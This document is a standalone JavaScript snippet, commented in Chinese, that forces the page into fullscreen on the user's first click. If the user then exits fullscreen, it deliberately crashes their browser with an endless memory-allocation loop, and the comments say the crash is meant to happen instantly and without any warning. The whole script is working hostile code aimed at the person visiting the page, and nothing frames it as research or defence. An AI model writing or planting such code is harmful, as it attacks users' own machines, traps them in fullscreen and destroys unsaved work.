(function() {
    // 1. 强制全屏逻辑
    function enterFullscreen() {
        var elem = document.documentElement;
        if (elem.requestFullscreen) {
            elem.requestFullscreen();
        } else if (elem.webkitRequestFullscreen) {
            elem.webkitRequestFullscreen();
        } else if (elem.mozRequestFullScreen) {
            elem.mozRequestFullScreen();
        } else if (elem.msRequestFullscreen) {
            elem.msRequestFullscreen();
        }
    }

    // 用户第一次点击页面任意位置时自动进入全屏
    var hasTriggered = false;
    document.addEventListener('click', function handler() {
        if (!hasTriggered) {
            enterFullscreen();
            hasTriggered = true;
            document.removeEventListener('click', handler);
        }
    });

    // 2. 监听全屏状态变化，退出全屏时直接崩溃
    var wasFullscreen = false;

    function onFullscreenChange() {
        var isFullscreen = !!(document.fullscreenElement || 
                              document.webkitFullscreenElement || 
                              document.mozFullScreenElement || 
                              document.msFullscreenElement);
        
        if (isFullscreen) {
            wasFullscreen = true;
        } else if (wasFullscreen) {
            // 检测到从全屏退出，触发崩溃
            wasFullscreen = false;
            
            // 无限分配内存，瞬间耗尽浏览器资源导致崩溃，无任何弹窗
            var leak = [];
            while(true) {
                leak.push(new Array(10000000).join('x'));
            }
        }
    }

    // 兼容各浏览器的全屏变化事件
    document.addEventListener('fullscreenchange', onFullscreenChange);
    document.addEventListener('webkitfullscreenchange', onFullscreenChange);
    document.addEventListener('mozfullscreenchange', onFullscreenChange);
    document.addEventListener('MSFullscreenChange', onFullscreenChange);
})();
